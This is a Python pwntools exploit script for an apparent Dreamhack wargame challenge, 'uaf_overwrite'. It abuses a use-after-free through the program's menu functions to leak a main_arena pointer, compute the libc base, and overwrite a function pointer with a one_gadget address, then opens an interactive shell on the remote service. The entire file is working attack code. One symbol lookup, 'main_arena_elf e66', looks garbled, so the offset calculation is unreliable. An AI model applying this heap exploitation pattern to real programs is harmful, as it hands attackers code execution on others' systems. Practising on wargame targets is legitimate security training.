from pwn import *

# p = process("./uaf_overwrite")

# nc host3.dreamhack.games 8778
p = remote("host3.dreamhack.games", 8778)

libc = ELF("./libc-2.27.so")

# one_gadget_local = [0x45226, 0x4527a, 0xf03a4, 0xf1247] # local
one_gadget_remote = [0x4f3d5, 0x4f432, 0x10a41c]  # remote

def human_func(weight, age):
    p.sendlineafter("> ", "1")
    p.recvuntil("Weight: ")
    p.sendline(str(weight))
    p.recvuntil("Age: ")
    p.sendline(str(age))
    
def robot_func(weight):
    p.sendlineafter("> ", "2")
    p.recvuntil("Weight: ")
    p.sendline(str(weight))
    
def custom_func(size, data, index):
    p.sendlineafter("> ", "3")
    p.recvuntil(": ")
    p.sendline(str(size))
    
    p.recvuntil(": ")
    p.send(data)
    p.recvuntil(": ")
    p.sendline(str(index))
    
custom_func(0x500, b"A"*4, -1)
custom_func(0x500, b"A"*4, -1)
custom_func(0x500, b"A"*4, 0)
custom_func(0x500, b"b", -1)

main_arena = u64(p.recvline()[:-1].ljust(8, b"\x00"))
# libc_base = main_arena - 0x3c4b62     # local
libc_base = main_arena - libc.symbols["main_arena_elf e66"]
# libc.address = main_arena - libc.symbols["main_arena_elf e66"]     # remote

# og = libc_base + one_gadget_local[0]    # local
og = libc_base + one_gadget_remote[0]     # remote

print("main_arena: " + hex(main_arena))
print("libc_base: " + hex(libc_base))
print("og: " + hex(og))

human_func(0x100, og)
robot_func(0x100)


p.interactive()